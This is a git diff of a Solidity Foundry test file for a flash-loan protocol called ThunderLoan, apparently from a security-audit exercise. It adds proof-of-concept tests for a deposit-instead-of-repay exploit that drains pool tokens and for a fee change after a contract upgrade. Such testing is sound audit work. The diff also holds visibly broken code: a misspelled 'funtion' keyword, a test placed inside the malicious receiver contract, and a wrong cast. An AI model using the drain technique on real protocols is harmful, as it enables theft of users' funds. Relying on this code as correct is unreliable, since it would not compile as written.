@@ -11,6 +11,7 @@ import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
 import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
 import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {ThunderLoanUpgraded} from "../../src/protocol/ThunderLoanUpgraded.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -179,6 +180,9 @@ contract ThunderLoanTest is BaseTest {
         DepositOverRepay dor = DepositOverRepay(address(thunderLoan));
         tokenA.mint(user, fee);
         thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemMoney();
+        vm.stopPrank();
+        assertEq(tokenA.balanceOf(address(dor)), 50e18 + fee);
     }
 
 
@@ -202,8 +206,9 @@ contract ThunderLoanTest is BaseTest {
         external
         returns (bool)
     {
-        s_token = token;
+        s_token = IERC20(token);
         assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+        IERC20(token).approve(address(thunderLoan), amount + fee);
         thunderLoan.deposit(IERC20(token), amount + fee);
         return true;
 
@@ -211,7 +216,7 @@ contract ThunderLoanTest is BaseTest {
 
         funtion redeemMoney() public {
             uint256 amount = assetToken.balanceOf(address(this));
-            thunderLoan.redeem(address);
+            thunderLoan.redeem(address(s_token), amount);
         }
 
 }
@@ -269,6 +274,21 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
         IERC20(token).transfer(address(repayAddress), amount + fee);
         return true;
     }
+
+    function testUpgradeBreaks() public {
+    uint256 feeBeforeUpgrade = thunderLoan.getFee();
+    vm.startPrank(thunderLoan.owner());
+    ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
+    thunderLoan.upgradeToAndCall(address(upgraded), "");
+    uint256 feeAfterUpgrade = thunderLoan.getFee();
+    vm.stopPrank();
+
+    console2.log("Fee Before: ", feeBeforeUpgrade);
+    console2.log("Fee After: ", feeAfterUpgrade);
+
+    assert(feeBeforeUpgrade != feeAfterUpgrade);
+}
+
 
 }
 
